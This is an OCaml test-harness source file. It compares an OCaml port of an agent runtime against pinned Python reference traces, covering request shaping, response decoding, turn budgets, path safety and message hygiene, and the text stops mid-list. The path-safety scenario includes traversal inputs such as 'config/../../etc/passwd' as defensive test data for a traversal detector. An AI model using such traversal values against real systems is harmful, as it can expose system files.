(* L4-L6: compare the OCaml candidate against the pinned reference traces.

   This is where parity credit is actually earned or denied, so it is the most
   dangerous code in the harness. Two disciplines govern it.

   First, the candidate is derived by calling the real candidate function with
   the faithful equivalent of each captured scenario. Nothing here is tuned to
   make a comparison pass. Where the candidate lacks a behaviour the reference
   has -- the system->developer role swap, tool passing -- the comparison
   diverges, and that divergence is the correct, informative result. Widening
   the normalizer or massaging the candidate call to hide it is hazard
   HZ-NRM-01, the exact move this whole apparatus exists to prevent.

   Second, only Implementation origin denies credit (R5). A divergence proved
   between two present traces is Implementation: the candidate demonstrably does
   something the reference does not. A missing fixture or an unbuildable
   candidate is Environment or Control -- it blocks credit without asserting a
   defect.

   The comparison core is pure and takes both traces as values, so it is tested
   without a database or a filesystem. Recording is a separate step. *)

type comparison = {
  scenario_id : string;
  node : string;
  reference : Yojson.Safe.t;
  candidate : Yojson.Safe.t;
  verdict : Parity_algebra.verdict;
  reference_digest : string;
  candidate_digest : string;
  diagnostic : Fractal_diagnostic.t option;
}

(* Dummy credentials: [build] resolves them to fill endpoint and api_key, which
   are discarded here -- only the request body is compared, and the body does
   not depend on the key. *)
let credentials : Openrouter_contract.credentials =
  { supplied_key = Some "unused-for-shaping"; openrouter_key = None;
    openai_key = None; base_url_override = None }

let message ~role ~content =
  `Assoc [ ("role", `String role); ("content", `String content) ]

(* The candidate under test, one build per captured scenario, each the faithful
   OCaml equivalent of the request that produced the reference trace. The
   candidate exposes no [tools] parameter and performs no role swap; those gaps
   are real and must surface as divergences rather than be papered over. *)
let lookup_tool =
  `Assoc
    [ ("type", `String "function");
      ("function",
       `Assoc
         [ ("name", `String "lookup");
           ("description", `String "look something up");
           ("parameters", `Assoc [ ("type", `String "object") ]) ]) ]

(* The seven agent_loop stub scenarios retired 2026-08-12: their fixtures
   were vacuous request-shaping traces carrying capability names they never
   touched (H-1, quarantined by HZ-FIX-03 since discovery), the fixture
   files were already deleted, and every agent_loop slice now earns credit
   through real unit scenarios (hygiene. / loop. / budget. / prompt. /
   context. / compress. / finalize.). The HZ-FIX-03 guards in
   Reference_capture.save and record stay: they protect the future, not
   just the 88. *)

let candidate_body scenario_id =
  let build ?(tools = []) ?max_tokens ~model_id messages =
    let request =
      Openrouter_contract.build ~credentials ~model_id ~messages ~tools ?max_tokens
        ~reasoning:Openrouter_contract.Unspecified ~supports_reasoning:false
        ~session_id:None ~provider_preferences:None ~pareto_min_coding_score:None ()
    in
    Some request.Openrouter_contract.body
  in
  match scenario_id with
  | "chat.minimal" -> build ~model_id:"openai/gpt-5.4" [ message ~role:"user" ~content:"hi" ]
  | "chat.max_tokens" ->
      build ~model_id:"openai/gpt-5.4" ~max_tokens:256 [ message ~role:"user" ~content:"hi" ]
  | "chat.anthropic_model" ->
      build ~model_id:"anthropic/claude-sonnet-4.5" [ message ~role:"user" ~content:"hi" ]
  | "chat.system_prefix" ->
      (* A system message: the candidate now applies the same developer-role
         swap the reference does for gpt-5, so this should agree. *)
      build ~model_id:"openai/gpt-5.4"
        [ message ~role:"system" ~content:"be terse"; message ~role:"user" ~content:"hi" ]
  | "chat.with_tools" ->
      (* The candidate now accepts tools, passed through to the body as the
         reference does. Same tool the capture scenario used. *)
      build ~model_id:"openai/gpt-5.4" ~tools:[ lookup_tool ]
        [ message ~role:"user" ~content:"hi" ]
  | "chat.multi_turn" ->
      build ~model_id:"openai/gpt-5.4"
        [ message ~role:"user" ~content:"a"; message ~role:"assistant" ~content:"b";
          message ~role:"user" ~content:"c" ]
  | "chat.codex_developer" ->
      (* codex is a developer-role model: the leading system message swaps. *)
      build ~model_id:"openai/codex-mini"
        [ message ~role:"system" ~content:"s"; message ~role:"user" ~content:"u" ]
  | "chat.anthropic_system" ->
      (* anthropic is not a developer-role model: no swap. *)
      build ~model_id:"anthropic/claude-sonnet-4.5"
        [ message ~role:"system" ~content:"s"; message ~role:"user" ~content:"u" ]
  | "chat.two_tools" ->
      let tool name =
        `Assoc [ ("type", `String "function");
                 ("function", `Assoc [ ("name", `String name) ]) ]
      in
      build ~model_id:"openai/gpt-5.4" ~tools:[ tool "a"; tool "b" ]
        [ message ~role:"user" ~content:"hi" ]
  | _ -> None

(* The node each scenario concerns. Request shaping and response decoding are
   both the provider-transport capability. *)
let node_of scenario_id =
  let has_prefix p =
    String.length scenario_id >= String.length p
    && String.sub scenario_id 0 (String.length p) = p
  in
  if has_prefix "agent_loop." then "hermes." ^ scenario_id
  else if has_prefix "hygiene." then "hermes.agent_loop.message_hygiene"
  else if has_prefix "redact." then "hermes.agent_loop.message_hygiene"
  else if has_prefix "loop." then "hermes.agent_loop.conversation_loop"
  else if has_prefix "prompt." then "hermes.agent_loop.prompt_assembly"
  else if has_prefix "context." then "hermes.agent_loop.context_engine"
  else if has_prefix "compress." then "hermes.agent_loop.context_compression"
  else if has_prefix "finalize." then "hermes.agent_loop.turn_finalization"
  else if has_prefix "budget." then "hermes.agent_loop.interrupt_control"
  else if has_prefix "path." then "hermes.tool_execution.path_and_url_safety"
  else if has_prefix "tool.registry" then "hermes.tool_execution.tool_registry"
  else if has_prefix "tool.destructive" then "hermes.tool_execution.tool_dispatch"
  else if has_prefix "tool.approval" then "hermes.tool_execution.approval_policy"
  else if has_prefix "tool.patch" then "hermes.tool_execution.file_operations"
  else if has_prefix "tool.result" then "hermes.tool_execution.result_normalization"
  else if has_prefix "cfile.coding_context" then "hermes.context_files.context_file_loading"
  else if has_prefix "cfile.ancestor" then "hermes.context_files.subdirectory_hints"
  else if has_prefix "cfile.breakdown" then "hermes.context_files.context_breakdown"
  else if has_prefix "cfile.cwd_placeholder" then "hermes.context_files.runtime_cwd_scope"
  else if has_prefix "mem.manager" then "hermes.memory.memory_manager"
  else if has_prefix "mem.trivial" then "hermes.memory.memory_providers"
  else if has_prefix "mem.session_state" then "hermes.memory.session_state"
  else if has_prefix "mem.portability" then "hermes.memory.state_portability"
  else if has_prefix "skill.discovery" then "hermes.skills.skill_discovery"
  else if has_prefix "skill.bundles" then "hermes.skills.skill_bundles"
  else if has_prefix "skill.preprocessing" then "hermes.skills.skill_preprocessing"
  else if has_prefix "skill.sync" then "hermes.skills.skill_sync"
  else if has_prefix "skill.provenance" then "hermes.skills.skill_provenance"
  else if has_prefix "cli.repl" then "hermes.interactive_cli.repl_session"
  else if has_prefix "cli.slash" then "hermes.interactive_cli.slash_commands"
  else if has_prefix "cli.fuzzy" then "hermes.interactive_cli.terminal_ui"
  else if has_prefix "cli.approval" then "hermes.interactive_cli.approval_prompts"
  else if has_prefix "cli.bang" then "hermes.interactive_cli.shell_passthrough"
  else if has_prefix "mcp.client" then "hermes.mcp.mcp_client"
  else if has_prefix "mcp.oauth" then "hermes.mcp.mcp_oauth"
  else if has_prefix "mcp.config" then "hermes.mcp.mcp_configuration"
  else if has_prefix "mcp.surface" then "hermes.mcp.mcp_server_surface"
  else if has_prefix "mcp.supervision" then "hermes.mcp.mcp_supervision"
  else if has_prefix "sub.lifecycle" then "hermes.subagents.subagent_lifecycle"
  else if has_prefix "sub.delegation" then "hermes.subagents.delegation"
  else if has_prefix "sub.async" then "hermes.subagents.async_delegation"
  else if has_prefix "sub.moa" then "hermes.subagents.mixture_of_agents"
  else if has_prefix "sub.kanban" then "hermes.subagents.kanban_swarm"
  else if has_prefix "retry." then "hermes.model_routing.rate_and_retry"
  else if has_prefix "route." then "hermes.model_routing.route_resolution"
  else if has_prefix "anthropic." then "hermes.model_routing.anthropic_adapter"
  else if has_prefix "codex." then "hermes.model_routing.codex_runtime"
  else if has_prefix "gemini." then "hermes.model_routing.gemini_adapter"
  else if has_prefix "bedrock." then "hermes.model_routing.cloud_vendor_adapters"
  else "hermes.model_routing.provider_transports"

(* ------------------------------------------------------------ decoding *)

(* Provider response inputs for the decode capability, shared with the capture
   driver so both halves compare the same inputs. Each was probed against the
   frozen reference before being added. *)
let decode_scenarios : (string * Yojson.Safe.t) list =
  [ ( "decode.content",
      `Assoc
        [ ("choices",
           `List
             [ `Assoc
                 [ ("message", `Assoc [ ("role", `String "assistant");
                                        ("content", `String "hello") ]);
                   ("finish_reason", `String "stop") ] ]) ] );
    ( "decode.tool_call",
      `Assoc
        [ ("choices",
           `List
             [ `Assoc
                 [ ("message",
                    `Assoc
                      [ ("content", `Null);
                        ("tool_calls",
                         `List
                           [ `Assoc
                               [ ("id", `String "call_1");
                                 ("function",
                                  `Assoc [ ("name", `String "lookup");
                                           ("arguments", `String "{}") ]) ] ]) ]);
                   ("finish_reason", `String "tool_calls") ] ]) ] );
    ( "decode.usage",
      `Assoc
        [ ("choices",
           `List
             [ `Assoc
                 [ ("message", `Assoc [ ("content", `String "hi") ]);
                   ("finish_reason", `String "stop") ] ]);
          ("usage",
           `Assoc
             [ ("prompt_tokens", `Int 10); ("completion_tokens", `Int 5);
               ("total_tokens", `Int 15) ]) ] );
    ( "decode.refusal",
      `Assoc
        [ ("choices",
           `List
             [ `Assoc
                 [ ("message",
                    `Assoc [ ("content", `Null);
                             ("refusal", `String "I cannot help with that") ]);
                   ("finish_reason", `String "stop") ] ]) ] ) ]

(* Project the candidate decode output into the canonical contract schema the
   reference adapter emits: content, finish_reason, tool_calls, usage. The
   candidate now carries usage.total_tokens (a faithful pass-through) and
   promotes a sole-payload refusal to content_filter inside Openrouter_transport,
   so those formerly-divergent scenarios now agree. The projection still hides
   nothing: it emits exactly the reference schema, so any field the candidate
   lacks would surface as a divergence rather than being trimmed away. *)
(* The canonical projection of a decoded response, shared by the decode path and
   the session-replay path so both compare on exactly the same reference schema. *)
let project_response (response : Openrouter_transport.response) : Yojson.Safe.t =
  let base =
    [ ("content",
       match response.Openrouter_transport.content with
       | Some text -> `String text
       | None -> `Null);
      ("finish_reason", `String response.Openrouter_transport.finish_reason) ]
  in
  let tool_calls =
    match response.Openrouter_transport.tool_calls with
    | [] -> []
    | calls ->
        [ ( "tool_calls",
            `List
              (List.map
                 (fun (tc : Openrouter_transport.tool_call) ->
                   `Assoc
                     [ ("id", `String tc.id); ("name", `String tc.name);
                       ("arguments", `String tc.arguments) ])
                 calls) ) ]
  in
  let usage =
    match response.Openrouter_transport.usage with
    | None -> []
    | Some u ->
        let field name = function Some v -> [ (name, `Int v) ] | None -> [] in
        [ ( "usage",
            `Assoc
              (field "prompt_tokens" u.Openrouter_transport.prompt_tokens
              @ field "completion_tokens" u.Openrouter_transport.completion_tokens
              @ field "total_tokens" u.Openrouter_transport.total_tokens) ) ]
  in
  `Assoc (base @ tool_calls @ usage)

let candidate_decode provider_response =
  Option.map project_response (Openrouter_transport.decode provider_response)

let sha256 value =
  let path = Filename.temp_file "hermes-compare-" ".txt" in
  Fun.protect
    ~finally:(fun () -> if Sys.file_exists path then Sys.remove path)
    (fun () ->
      let channel = open_out_bin path in
      output_string channel value;
      close_out channel;
      match Inventory.sha256_file path with Ok d -> d | Error m -> failwith m)

(* The pure comparison. Both traces are present, so the only two outcomes are
   Verified (they agree after normalization) and Divergent (they do not). A
   divergence is Implementation origin -- the only origin permitted to deny
   credit. *)
let compare ~normalizer ~scenario_id ~node ~reference ~candidate =
  let reference_digest = sha256 (Parity_normalizer.render normalizer reference) in
  let candidate_digest = sha256 (Parity_normalizer.render normalizer candidate) in
  let agree = Parity_normalizer.equal normalizer reference candidate in
  let verdict = if agree then Parity_algebra.Verified else Parity_algebra.Divergent in
  let diagnostic =
    if agree then None
    else
      Some
        (Fractal_diagnostic.of_divergence ~node ~subject:scenario_id ~reference_digest
           ~candidate_digest)
  in
  { scenario_id; node; reference; candidate; verdict; reference_digest;
    candidate_digest; diagnostic }

(* Comparison outcome for a scenario whose candidate or reference is absent.
   These block credit; they never deny it, because nothing was proved about the
   candidate's behaviour. *)
type outcome = Compared of comparison | Blocked of Fractal_diagnostic.t

let outcome_verdict = function
  | Compared comparison -> comparison.verdict
  | Blocked _ -> Parity_algebra.Blocked

(* Compare one scenario end to end: load its pinned reference (L4), build the
   candidate, normalize and compare (L5), and classify the result. Recording
   (L6) is the caller's job so that this stays pure of the database. *)
let compare_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match candidate_body scenario_id with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no candidate build defined for " ^ scenario_id)
           ~cause:"the harness has no candidate mapping for this scenario"
           ~fix:"add a candidate_body case, or remove the orphan fixture" ())
  | Some candidate -> (
      match
        Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer
      with
      | Error failure ->
          Blocked
            (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
               ~subject:scenario_id failure)
      | Ok capture ->
          Compared
            (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
               ~reference:capture.Reference_capture.trace ~candidate))

(* The decode counterpart: run the candidate decoder on the scenario's provider
   input, project to the canonical schema, and compare against the pinned
   reference decode. Same discipline -- a genuine candidate gap (no
   total_tokens, no refusal promotion) surfaces as a divergence, never hidden. *)
let compare_decode_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id decode_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no decode input defined for " ^ scenario_id)
           ~cause:"the harness has no decode scenario for this id"
           ~fix:"add a decode_scenarios case, or remove the orphan fixture" ())
  | Some provider_response -> (
      match candidate_decode provider_response with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Implementation
               ~impact:Fractal_diagnostic.Denies_credit ~node:(node_of scenario_id)
               ~subject:scenario_id
               ~message:"candidate decoder rejected a response the reference accepts"
               ~cause:"Openrouter_transport.decode returned None"
               ~fix:"the candidate decoder is stricter than the reference; align it"
               ())
      | Some candidate -> (
          match
            Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer
          with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Interrupt-control (agent_loop): the candidate Turn_budget replayed against a
   consume/refund sequence, compared to the frozen IterationBudget. A scenario is
   a max_total and an operation list carried in params; the candidate is projected
   to the reference's observed-state schema. The negative-cap scenario is EXPECTED
   to diverge on max_total: the candidate deliberately clamps to maintain its
   well_formed invariant (turn_budget.mli), which the reference does not -- a real,
   documented difference, surfaced not hidden, never patched away by widening. *)
let budget_scenarios : (string * Yojson.Safe.t) list =
  [ ( "budget.exhaust",
      `Assoc [ ("max_total", `Int 3);
               ("operations",
                `List [ `String "consume"; `String "consume"; `String "consume";
                        `String "consume" ]) ] );
    ( "budget.refund",
      `Assoc [ ("max_total", `Int 2);
               ("operations",
                `List [ `String "consume"; `String "consume"; `String "refund";
                        `String "consume" ]) ] );
    ( "budget.zero",
      `Assoc [ ("max_total", `Int 0); ("operations", `List [ `String "consume" ]) ] );
    ( "budget.negative",
      `Assoc [ ("max_total", `Int (-5)); ("operations", `List [ `String "consume" ]) ] ) ]

let candidate_budget params =
  let field name =
    match params with `Assoc fields -> List.assoc_opt name fields | _ -> None
  in
  match (field "max_total", field "operations") with
  | Some (`Int max_total), Some (`List operations) ->
      let budget = ref (Turn_budget.create max_total) in
      let consumes =
        List.filter_map
          (fun operation ->
            match operation with
            | `String "consume" ->
                let result = Turn_budget.consume !budget in
                budget := result.Turn_budget.budget;
                Some (`Bool result.Turn_budget.allowed)
            | `String "refund" ->
                budget := Turn_budget.refund !budget;
                None
            | _ -> None)
          operations
      in
      Some
        (`Assoc
          [ ("max_total", `Int (!budget).Turn_budget.maximum);
            ("used", `Int (Turn_budget.used !budget));
            ("remaining", `Int (Turn_budget.remaining !budget));
            ("consumes", `List consumes) ])
  | _ -> None

let compare_budget_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id budget_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no budget input defined for " ^ scenario_id)
           ~cause:"the harness has no budget scenario for this id"
           ~fix:"add a budget_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_budget params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the budget scenario is malformed"
               ~cause:"candidate_budget could not read max_total/operations"
               ~fix:"fix the budget_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Path & URL safety (tool_execution): the candidate Path_safety predicate over a
   path list, compared to the frozen tools/path_security.has_traversal_component.
   A scenario carries the paths in params; the trace maps each path to its
   boolean, so one scenario is a rich differential test across safe, traversal and
   tricky (..b, ./, //) inputs -- proving the reproduction faithful, not assuming. *)
let path_scenarios : (string * Yojson.Safe.t) list =
  [ ( "path.traversal",
      `Assoc
        [ ( "paths",
            `List
              (List.map
                 (fun p -> `String p)
                 [ "a/b"; "safe/nested/file.txt"; "a/../b"; "../a"; ".."; "a/..b";
                   "a/./b"; "a//b"; "/a/../b"; "a/b/../.."; "..../x";
                   "config/../../etc/passwd" ]) ) ] ) ]

let candidate_path params =
  let field name = match params with `Assoc fields -> List.assoc_opt name fields | _ -> None in
  match field "paths" with
  | Some (`List paths) ->
      let results =
        List.filter_map
          (function
            | `String path -> Some (path, `Bool (Path_safety.has_traversal_component path))
            | _ -> None)
          paths
      in
      Some (`Assoc [ ("results", `Assoc results) ])
  | _ -> None

let compare_path_scenario ~root ~normalizer ~snapshot_digest scenario_id =
  match List.assoc_opt scenario_id path_scenarios with
  | None ->
      Blocked
        (Fractal_diagnostic.make ~hazard:"" ~level:Fractal_diagnostic.L6_receipt
           ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
           ~node:(node_of scenario_id) ~subject:scenario_id
           ~message:("no path input defined for " ^ scenario_id)
           ~cause:"the harness has no path scenario for this id"
           ~fix:"add a path_scenarios case, or remove the orphan fixture" ())
  | Some params -> (
      match candidate_path params with
      | None ->
          Blocked
            (Fractal_diagnostic.make ~level:Fractal_diagnostic.L6_receipt
               ~origin:Fractal_diagnostic.Control ~impact:Fractal_diagnostic.Blocks_credit
               ~node:(node_of scenario_id) ~subject:scenario_id
               ~message:"the path scenario is malformed"
               ~cause:"candidate_path could not read the paths list"
               ~fix:"fix the path_scenarios entry" ())
      | Some candidate -> (
          match Reference_capture.load ~root scenario_id ~snapshot_digest ~normalizer with
          | Error failure ->
              Blocked
                (Capture_diagnostic.of_capture_failure ~node:(node_of scenario_id)
                   ~subject:scenario_id failure)
          | Ok capture ->
              Compared
                (compare ~normalizer ~scenario_id ~node:(node_of scenario_id)
                   ~reference:capture.Reference_capture.trace ~candidate)))

(* Message hygiene (agent_loop): the candidate Message_hygiene.sanitize_messages
   over labeled (model, messages) cases, compared to the frozen
   AIAgent._sanitize_tool_calls_for_strict_api -- the callable unit of the
   request-path hygiene pipeline. Cases exercise the strip set {call_id,
   response_item_id} and the model-gated extra_content strip across both gate
   branches (gemini AND gemma keep; strict models strip), plus the guard
   shapes: a non-dict tool_calls entry passes through, a non-list tool_calls
   value returns the message unchanged, a message without tool_calls is
   untouched. Assistant tool-call turns carry content: null, the real
   transcript shape.

   Scope, disclosed (the slice credit rests on the measured units alone):
     - the list-level repairs ARE now measured: hygiene.list_repairs below
       drives the frozen sanitize_api_messages against the candidate
       Message_repairs (role allowlist, empty-content healing, empty
       tool_calls, name sentinel, orphan repair, dedup);
     - the frozen SURROGATE pass (message_sanitization._sanitize_surrogates)
       remains a separate unmeasured unit -- it belongs to the
       conversation_loop slice;
     - the inline bookkeeping-key drops in the request loop (keys with a
       leading underscore, tool_name, the codex_ item lists) are loop code,
       not a callable, and are likewise deferred to the loop slice;
     - the candidate's extra strips (top-level thought_signature, blanket
       surrogate scrub) never fire on these inputs because no faithful frozen
       transcript shape carries them (extra_content is the thought_signature
       carrier per the frozen docstring); comparing them would need inputs
       outside the reference's own domain (L-04);
     - the frozen model=None default (strip) is outside the candidate's typed
       shape (~model_id : string) and is unexercised. *)
let hygiene_scenarios : (string * Yojson.Safe.t) list =
  let base_call =
    [ ("id", `String "tc_1"); ("type", `String "function");
      ("function", `Assoc [ ("name", `String "lookup"); ("arguments", `String "{}") ]) ]
  in
  let assistant tool_calls =
    `Assoc [ ("role", `String "assistant"); ("content", `Null); ("tool_calls", tool_calls) ]
  in
  let case ~label ~model messages =
    `Assoc [ ("label", `String label); ("model", `String model); ("messages", `List messages) ]
  in
  let extra_content =
    ("extra_content", `Assoc [ ("google", `Assoc [ ("thought_signature", `String "c2ln") ]) ])
  in
  [ ( "hygiene.strict_strip",
      `Assoc
        [ ( "cases",
            `List
              [ case ~label:"strip_codex_fields" ~model:"openai/gpt-5.4"
                  [ assistant
                      (`List
                        [ `Assoc
                            (base_call
                            @ [ ("call_id", `String "call_legacy_1");
                                ("response_item_id", `String "ri_1") ]) ]) ];
                case ~label:"strip_extra_content_strict" ~model:"openai/gpt-5.4"
                  [ assistant (`List [ `Assoc (base_call @ [ extra_content ]) ]) ];
                case ~label:"keep_extra_content_gemini" ~model:"google/gemini-3-pro-preview"
                  [ assistant (`List [ `Assoc (base_call @ [ extra_content ]) ]) ];
                case ~label:"keep_extra_content_gemma" ~model:"google/gemma-3-27b-it"
                  [ assistant (`List [ `Assoc (base_call @ [ extra_content ]) ]) ];
                case ~label:"non_dict_tool_call_entry" ~model:"openai/gpt-5.4"
                  [ assistant
                      (`List
                        [ `String "corrupt-entry";
                          `Assoc (base_call @ [ ("call_id", `String "call_2") ]) ]) ];
                case ~label:"no_tool_calls_message" ~model:"openai/gpt-5.4"
                  [ `Assoc [ ("role", `String "user"); ("content", `String "hi") ] ];
                case ~label:"tool_calls_not_a_list" ~model:"openai/gpt-5.4"
                  [ assistant (`String "bogus") ] ] );
          ("unit", `String "strict_strip") ] );
    ( "hygiene.list_repairs",
      (* The deferred list-level unit, measured: the frozen
         agent_runtime_helpers.sanitize_api_messages against the candidate
         Message_repairs.sanitize_api_messages. Eleven labeled sequences,
         one per repair, plus the sequencing-sensitive interaction (an
         empty-content assistant with tool_calls:[] is HEALED first, then
         loses the empty array) and the call_id-over-id coalescing rule. *)
      let msg fields = `Assoc fields in
      let seq ~label messages =
        `Assoc [ ("label", `String label); ("messages", `List messages) ]
      in
      let call ?call_id ~id ~name () =
        `Assoc
          ((match call_id with Some c -> [ ("call_id", `String c) ] | None -> [])
          @ [ ("id", `String id); ("type", `String "function");
              ("function", `Assoc [ ("name", `String name); ("arguments", `String "{}") ]) ])
      in
      `Assoc
        [ ( "cases",
            `List
              [ seq ~label:"invalid_role_dropped"
                  [ msg [ ("role", `String "telemetry"); ("content", `String "boot") ];
                    msg [ ("role", `String "user"); ("content", `String "hi") ] ];
                seq ~label:"empty_non_final_healed"
                  [ msg [ ("role", `String "assistant"); ("content", `Null) ];
                    msg [ ("role", `String "user"); ("content", `String "next") ];
                    msg [ ("role", `String "assistant"); ("content", `String "") ] ];
                seq ~label:"codex_carrier_not_healed"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `String "");
                        ("codex_message_items",
                         `List [ `Assoc [ ("type", `String "message") ] ]) ];
                    msg [ ("role", `String "user"); ("content", `String "go") ] ];
                seq ~label:"blank_text_block_healed"
                  [ msg
                      [ ("role", `String "user");
                        ("content",
                         `List [ `Assoc [ ("type", `String "text"); ("text", `String "  ") ] ]) ];
                    msg [ ("role", `String "user"); ("content", `String "real") ] ];
                seq ~label:"empty_tool_calls_dropped"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `String "ok");
                        ("tool_calls", `List []) ] ];
                seq ~label:"heal_then_drop_order"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `Null);
                        ("tool_calls", `List []) ];
                    msg [ ("role", `String "user"); ("content", `String "next") ] ];
                seq ~label:"empty_name_sentinel"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `Null);
                        ("tool_calls", `List [ call ~id:"c1" ~name:"" () ]) ];
                    msg
                      [ ("role", `String "tool"); ("tool_call_id", `String "c1");
                        ("content", `String "result") ] ];
                seq ~label:"orphaned_result_dropped"
                  [ msg [ ("role", `String "user"); ("content", `String "q") ];
                    msg
                      [ ("role", `String "tool"); ("tool_call_id", `String "ghost");
                        ("content", `String "zombie") ] ];
                seq ~label:"missing_result_stubbed"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `Null);
                        ("tool_calls", `List [ call ~id:"c2" ~name:"lookup" () ]) ];
                    msg [ ("role", `String "user"); ("content", `String "then") ] ];
                seq ~label:"duplicate_ids_collapsed"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `Null);
                        ("tool_calls",
                         `List [ call ~id:"c3" ~name:"a" (); call ~id:"c3" ~name:"b" () ]) ];
                    msg
                      [ ("role", `String "tool"); ("tool_call_id", `String "c3");
                        ("content", `String "r1") ];
                    msg
                      [ ("role", `String "tool"); ("tool_call_id", `String "c3");
                        ("content", `String "r2") ] ];
                seq ~label:"call_id_coalesced"
                  [ msg
                      [ ("role", `String "assistant"); ("content", `Null);
                        ("tool_calls",
                         `List [ call ~call_id:"cx" ~id:"cy" ~name:"lookup" () ]) ];
                    msg
                      [ ("role", `String "tool"); ("tool_call_id", `String "cx");
                        ("content", `String "found") ] ] ] );
          ("unit", `String "list_repairs") ] );
    ( "hygiene.surrogates",
      (* The last hygiene unit: message_sanitization._sanitize_surrogates
         against the candidate Message_hygiene.replace_surrogate_utf8. A lone
         surrogate cannot cross the OCaml->Python JSON boundary as bytes
         (json.load rejects WTF-8; that rejection is WHY the unit exists), so
         each case declares its text as PARTS -- literal runs and code
         points -- and both sides materialize the same string in their own
         representation: the adapter via chr(cp), the candidate via the
         3-byte UTF-8 encoding. Outputs contain only U+FFFD and valid text,
         which round-trips cleanly.

         Domain: valid code-point sequences, the frozen str domain. The
         candidate's byte-level behaviour on truncated/malformed UTF-8 has
         no counterpart there (the reference operates post-decode) and is
         not measured. The nested-structure walker
         (_sanitize_structure_surrogates) is deferred: its added behaviour
         over this unit is the walk itself, and every string leaf would
         need this same parts transport for one recursion step of signal. *)
      let parts ~label items =
        `Assoc
          [ ("label", `String label);
            ("parts",
             `List
               (List.map
                  (function
                    | `Lit text -> `Assoc [ ("lit", `String text) ]
                    | `Cp code_point -> `Assoc [ ("cp", `Int code_point) ])
                  items)) ]
      in
      `Assoc
        [ ( "cases",
            `List
              [ parts ~label:"clean_ascii" [ `Lit "hello" ];
                parts ~label:"lone_high" [ `Lit "a"; `Cp 0xD800; `Lit "b" ];
                parts ~label:"lone_low" [ `Cp 0xDC00 ];
                parts ~label:"cesu_pair" [ `Cp 0xD83D; `Cp 0xDE00 ];
                parts ~label:"astral_untouched" [ `Lit "\xF0\x9F\x98\x80" ];
                parts ~label:"ed_range_valid" [ `Lit "x"; `Cp 0xD000; `Lit "y" ];
                parts ~label:"scattered"
                  [ `Lit "x"; `Cp 0xD800; `Lit "y"; `Cp 0xDFFF; `Lit "z" ] ] );
          ("unit", `String "surrogates") ] ) ]

(* Materialize a surrogate-scenario parts list as UTF-8/WTF-8 bytes -- the
   candidate side of the shared construction rule. Code points here are BMP
   by scenario construction, so the 3-byte form is the whole encoder. *)
let text_of_parts parts =
  let utf8_of_bmp code_point =
    let byte index =
      match index with
      | 0 -> 0xE0 lor (code_point lsr 12)
      | 1 -> 0x80 lor ((code_point lsr 6) land 0x3F)
      | _ -> 0x80 lor (code_point land 0x3F)
    in
    String.init 3 (fun index -> Char.chr (byte index))
  in
  String.concat ""
    (List.map
       (fun part ->
         match part with
         | `Assoc [ ("lit", `String text) ] -> text
         | `Assoc [ ("cp", `Int code_point) ] -> utf8_of_bmp code_point
         | _ -> "")
       parts)

(* Conversation-loop send-path units: the argument canonicalization pass and
   the continuation prompt, each against its frozen counterpart in
   agent/conversation_loop.py. Excluded with reasons: the malformed-argument
   repair fallback (_repair_tool_call_arguments) is a separate unimplemented
   unit, so no case is malformed; _clone_message_for_send is differentially
   VACUOUS over this pipe (its output is structurally identical to its input
   by design -- sharing is a memory property JSON cannot see), and a scenario
   that cannot fail measures nothing (HZ-FIX-03). Floats are outside the
   canonical domain (Python repr vs OCaml float formatting). *)
let loop_scenarios : (string * Yojson.Safe.t) list =
  let msg fields = `Assoc fields in
  let seq ~label messages =
    `Assoc [ ("label", `String label); ("messages", `List messages) ]
  in
  let tc ?(extra = []) arguments =
    `Assoc
      ([ ("id", `String "t1"); ("type", `String "function");
         ("function",
          `Assoc [ ("name", `String "lookup"); ("arguments", `String arguments) ]) ]
      @ extra)
  in
  let assistant tool_calls =
    msg [ ("role", `String "assistant"); ("content", `Null); ("tool_calls", tool_calls) ]
  in
  [ ( "loop.canonical_args",
      `Assoc
        [ ( "cases",
            `List
